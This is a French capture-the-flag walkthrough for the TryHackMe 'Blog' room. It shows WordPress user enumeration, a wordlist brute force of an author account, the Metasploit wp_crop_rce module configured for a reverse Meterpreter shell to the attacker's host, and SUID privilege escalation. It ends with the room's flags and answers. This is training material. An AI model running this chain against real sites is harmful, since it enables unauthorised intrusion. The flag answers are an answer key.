# TryHackMe: Blog

**Objectif :** enumérer un WordPress 5.0 vulnerable, identifier les comptes du site, bruteforcer l'un des utilisateurs auteurs, exploiter la faille `wp_crop_rce`, obtenir un shell sur la machine, puis elever les privileges via un binaire SUID custom.

---

## Introduction

La room **Blog** est un bon exemple de chaine WordPress complete :

- reconnaissance web et SMB
- enumeration d'utilisateurs WordPress
- brute force d'un compte auteur
- exploitation d'une RCE connue
- reverse engineering leger d'un binaire SUID

Elle pose cinq questions finales, mais le vrai travail se trouve dans la sequence d'exploitation.

---

## Enumeration initiale

Je commence par ajouter le vhost :

```bash
echo "<IP> blog.thm" | sudo tee -a /etc/hosts
```

Puis je lance Nmap :

```bash
nmap -sC -sV -Pn blog.thm
```

Le scan met en evidence :

- `22/tcp` - SSH
- `80/tcp` - HTTP
- `139/tcp` / `445/tcp` - SMB

Le site web identifie clairement :

- le CMS : `WordPress`
- la version : `5.0`

SMB expose aussi un share `BillySMB`, mais il sert surtout de diversion. Les fichiers qu'on y telecharge ne donnent pas l'acces principal.

---

## Enumeration WordPress

Je passe ensuite a `wpscan` :

```bash
wpscan --url http://blog.thm --enumerate u
```

L'enumeration remonte plusieurs noms :

- `kwheel`
- `bjoel`

Le plus interessant pour la suite est `kwheel`, car il dispose d'un acces auteur suffisant pour la faille que nous allons exploiter.

Je brute force ensuite son mot de passe :

```bash
wpscan -U kwheel -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
```

Le mot de passe trouve est :

```text
cutiepie1
```

---

## Exploitation WordPress 5.0: crop-image shell upload

### Pourquoi cette faille marche ici

WordPress 5.0 est vulnerable a une chaine permettant :

- un path traversal dans le mecanisme de crop d'image
- puis l'inclusion de ce fichier comme template de page

Dans Metasploit, la room s'appuie sur :

```text
exploit/multi/http/wp_crop_rce
```

Je configure le module :

```text
use exploit/multi/http/wp_crop_rce
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set TARGETURI /
set LHOST <MON_IP_THM>
run
```

Une fois le module execute, j'obtiens un shell Meterpreter puis un shell systeme.

Je peux alors stabiliser si necessaire :

```bash
meterpreter> shell
SHELL=/bin/bash script -q /dev/null
```

---

## Recuperation du root flag

Le shell initial tourne sous `www-data`. Je cherche les binaires SUID :

```bash
find / -type f -user root -perm -u=s 2>/dev/null
```

Parmi eux, un binaire inhabituel attire l'attention :

```text
/usr/sbin/checker
```

Un simple reverse engineering ou `strings` suffit a comprendre sa logique :

- il verifie la presence de la variable d'environnement `admin`
- si elle existe, il fait `setuid(0)` puis lance `/bin/bash`

Je l'exploite donc directement :

```bash
export admin=1
/usr/sbin/checker
```

Je deviens root, puis je lis :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `9a0b2b618bef9bfa7ac28c1353d9f318`

---

## Recuperation du user flag

Une fois root, je cherche `user.txt` :

```bash
find / -type f -name user.txt 2>/dev/null
```

Deux emplacements ressortent :

- `/home/bjoel/user.txt`
- `/media/usb/user.txt`

Le bon flag se trouve ici :

```bash
cat /media/usb/user.txt
```

### Reponse

**user.txt:** `c8421899aae571f7af486492b71a8ab7`

### Question complementaire: Where was user.txt found?

### Reponse

**Where user.txt was found:** `/media/usb`

### Question complementaire: What CMS was Billy using?

### Reponse

**CMS:** `wordpress`

### Question complementaire: What version of the above CMS was being used?

### Reponse

**CMS version:** `5.0`

---

## Resume des reponses de la room

- root.txt `9a0b2b618bef9bfa7ac28c1353d9f318`
- user.txt `c8421899aae571f7af486492b71a8ab7`
- Where was user.txt found? `/media/usb`
- What CMS was Billy using? `wordpress`
- What version of the above CMS was being used? `5.0`

---

## Commandes importantes

### Enumeration WordPress

```bash
wpscan --url http://blog.thm --enumerate u
```

Permet d'identifier `kwheel` et `bjoel`.

### Bruteforce du mot de passe auteur

```bash
wpscan -U kwheel -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
```

Recupere `cutiepie1`.

### Exploit Metasploit

```text
use exploit/multi/http/wp_crop_rce
```

Transforme l'acces auteur en execution de code.

### Privesc custom

```bash
export admin=1
/usr/sbin/checker
```

Abuse la logique du binaire SUID custom.

---

## Conclusion

**Blog** est une room tres utile parce qu'elle sort du schema WordPress "simple upload de theme". Ici, l'exploitation passe par une vraie faille de version, puis par une petite etape de comprehension binaire en local pour finir la privesc proprement.

***Auteur*** *: Saad Idrissi*
